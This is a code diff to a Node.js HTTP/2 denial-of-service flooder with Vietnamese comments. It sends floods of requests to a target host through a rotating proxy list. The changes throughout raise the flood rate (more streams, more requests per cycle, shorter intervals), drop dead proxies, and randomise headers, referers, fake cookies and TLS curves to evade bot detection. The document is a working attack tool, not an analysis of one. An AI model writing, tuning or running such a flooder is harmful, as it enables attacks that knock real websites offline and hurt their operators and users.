@@ -71,7 +71,9 @@ const userAgents = [
 const accept_header = [
     "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
     "application/json, text/plain, */*",
-    "image/jpeg, image/png, */*"
+    "text/css,*/*;q=0.1",
+    "application/javascript,*/*;q=0.1",
+    "image/jpeg,image/png,image/webp,*/*;q=0.8"
 ];
 const lang_header = [
     "en-US,en;q=0.9",
@@ -81,7 +83,7 @@ const lang_header = [
 ];
 const encoding_header = ["gzip, deflate, br, zstd"];
 const sec_fetch_headers = {
-    "sec-fetch-dest": ["document", "script", "image", "font"],
+    "sec-fetch-dest": ["document", "script", "style", "image", "font"],
     "sec-fetch-mode": ["navigate", "cors", "no-cors", "same-origin"],
     "sec-fetch-site": ["same-origin", "same-site", "cross-site"]
 };
@@ -90,6 +92,7 @@ const referers = [
     `https://${parsedTarget.host}/`,
     `https://${parsedTarget.host}${parsedTarget.path}`,
     `https://${parsedTarget.host}/search?q=${randstr(6)}`,
+    `https://${parsedTarget.host}/category/${randstr(5)}`,
     "https://www.google.com/",
     "https://www.bing.com/",
     ""
@@ -118,6 +121,7 @@ const ciphers = [
 ].join(":");
 
 const proxies = readLines(args.proxyFile);
+const activeProxies = new Set(proxies); // Theo dõi proxy hoạt động
 
 if (cluster.isMaster) {
     for (let counter = 1; counter <= args.threads; counter++) {
@@ -150,6 +154,7 @@ class NetSocket {
         connection.on("data", chunk => {
             const response = chunk.toString("utf-8");
             if (!response.includes("HTTP/1.1 200")) {
+                activeProxies.delete(`${options.host}:${options.port}`); // Loại proxy không hoạt động
                 connection.destroy();
                 return callback(undefined, "invalid proxy response");
             }
@@ -157,11 +162,13 @@ class NetSocket {
         });
 
         connection.on("timeout", () => {
+            activeProxies.delete(`${options.host}:${options.port}`); // Loại proxy chậm
             connection.destroy();
             callback(undefined, "timeout");
         });
 
         connection.on("error", () => {
+            activeProxies.delete(`${options.host}:${options.port}`); // Loại proxy lỗi
             connection.destroy();
             callback(undefined, "error");
         });
@@ -210,7 +217,6 @@ function generateDynamicHeaders() {
         "sec-ch-prefers-color-scheme": randomElement(["light", "dark"]),
         "sec-ch-viewport-width": randomIntn(800, 1920).toString()
     };
-    // Thêm cookie ngẫu nhiên để mô phỏng phiên người dùng
     if (Math.random() > 0.5) {
         headers["cookie"] = `__cfduid=${randstr(32)}; session=${randstr(16)}`;
     }
@@ -218,7 +224,7 @@ function generateDynamicHeaders() {
 }
 
 function runFlooder() {
-    const proxyAddr = randomElement(proxies);
+    const proxyAddr = randomElement([...activeProxies]); // Chỉ lấy proxy hoạt động
     const parsedProxy = proxyAddr.split(":");
     if (!parsedProxy[0] || !parsedProxy[1]) return setTimeout(runFlooder, 1000);
 
@@ -226,7 +232,7 @@ function runFlooder() {
         host: parsedProxy[0],
         port: parseInt(parsedProxy[1]),
         address: parsedTarget.host + ":443",
-        timeout: 15 // Tăng timeout để xử lý proxy chậm
+        timeout: 15
     };
 
     Socker.HTTP(proxyOptions, (connection, error) => {
@@ -244,7 +250,7 @@ function runFlooder() {
             rejectUnauthorized: false,
             minVersion: 'TLSv1.2',
             maxVersion: 'TLSv1.3',
-            ecdhCurve: randomElement(['X25519', 'prime256v1', 'secp384r1']) // Ngẫu nhiên hóa curve để cải thiện JA3
+            ecdhCurve: randomElement(['X25519', 'prime256v1', 'secp384r1'])
         };
 
         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
@@ -254,8 +260,8 @@ function runFlooder() {
             protocol: "https:",
             settings: {
                 headerTableSize: 65536,
-                maxConcurrentStreams: 25, // Giảm xuống 25 để tránh bị phát hiện
-                initialWindowSize: 6291456,
+                maxConcurrentStreams: 30, // Tăng lên 30 để hỗ trợ nhiều request
+                initialWindowSize: 10485760, // Tăng để cải thiện throughput
                 maxHeaderListSize: 65536
             },
             createConnection: () => tlsConn
@@ -264,7 +270,7 @@ function runFlooder() {
         client.on("connect", () => {
             const IntervalAttack = setInterval(() => {
                 const dynHeaders = generateDynamicHeaders();
-                for (let i = 0; i < Math.min(args.Rate, 12); i++) { // Giảm xuống 12 request mỗi chu kỳ
+                for (let i = 0; i < Math.min(args.Rate, 15); i++) { // Tăng lên 15 request mỗi chu kỳ
                     const request = client.request(dynHeaders);
                     request.on("response", () => {
                         request.close();
@@ -276,7 +282,7 @@ function runFlooder() {
                     });
                     request.end();
                 }
-            }, 150); // Tăng lên 150ms để giảm áp lực
+            }, 120); // Giảm xuống 120ms để tăng tốc độ
             setTimeout(() => clearInterval(IntervalAttack), args.time * 1000);
         });
 
